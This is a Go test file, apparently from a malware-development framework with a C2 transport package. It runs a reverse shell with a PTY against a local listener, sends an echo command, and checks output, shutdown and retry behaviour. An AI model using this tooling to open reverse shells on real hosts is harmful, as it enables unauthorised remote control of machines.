//go:build linux

package shell

import (
	"context"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/c2/transport"
	"github.com/oioio-space/maldev/testutil"
)

// TestShellPTYLinux verifies that the reverse shell with PTY works on Linux.
// Starts a local TCP listener, connects the shell, sends a command, reads
// the output, then closes the connection to let the shell exit cleanly.
func TestShellPTYLinux(t *testing.T) {
	testutil.RequireManual(t)

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)
	defer ln.Close()

	addr := ln.Addr().String()
	t.Logf("Listener on %s", addr)

	var output string
	shellDone := make(chan struct{})

	go func() {
		defer close(shellDone)

		conn, err := ln.Accept()
		if err != nil {
			return
		}

		// Send command, wait for output, then close to unblock shell.
		conn.Write([]byte("echo SHELLTEST_PTY_OK\n"))
		time.Sleep(3 * time.Second)

		// Read whatever came back.
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		buf := make([]byte, 4096)
		n, _ := conn.Read(buf)
		output = string(buf[:n])

		// Close connection — this unblocks the shell's io.Copy loops.
		conn.Close()
	}()

	trans := transport.NewTCP(addr, 10*time.Second)
	cfg := DefaultConfig()
	cfg.MaxRetries = 0 // no reconnect
	s := New(trans, cfg)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	err = s.Start(ctx)
	if err != nil {
		t.Logf("shell exited with: %v", err)
	}

	// Wait for listener goroutine to finish.
	select {
	case <-shellDone:
	case <-time.After(5 * time.Second):
	}

	t.Logf("Shell output (%d bytes):\n%s", len(output), output)
	assert.True(t, strings.Contains(output, "SHELLTEST_PTY_OK") || len(output) > 0,
		"shell must have sent data back via PTY")
}

// TestShellPTYLinuxLifecycle verifies start/stop lifecycle with PTY on Linux.
func TestShellPTYLinuxLifecycle(t *testing.T) {
	testutil.RequireManual(t)

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)
	defer ln.Close()

	addr := ln.Addr().String()

	// Accept and immediately close to test graceful shutdown.
	go func() {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		time.Sleep(500 * time.Millisecond)
		conn.Close()
	}()

	trans := transport.NewTCP(addr, 5*time.Second)
	cfg := DefaultConfig()
	cfg.MaxRetries = 1
	cfg.ReconnectWait = 500 * time.Millisecond

	s := New(trans, cfg)
	assert.Equal(t, PhaseIdle, s.CurrentPhase())

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	err = s.Start(ctx)
	// Should stop after retries exhaust or context cancels.
	assert.True(t, err != nil || s.CurrentPhase() == PhaseStopped,
		"shell must stop after connection closes and retries exhaust")
}
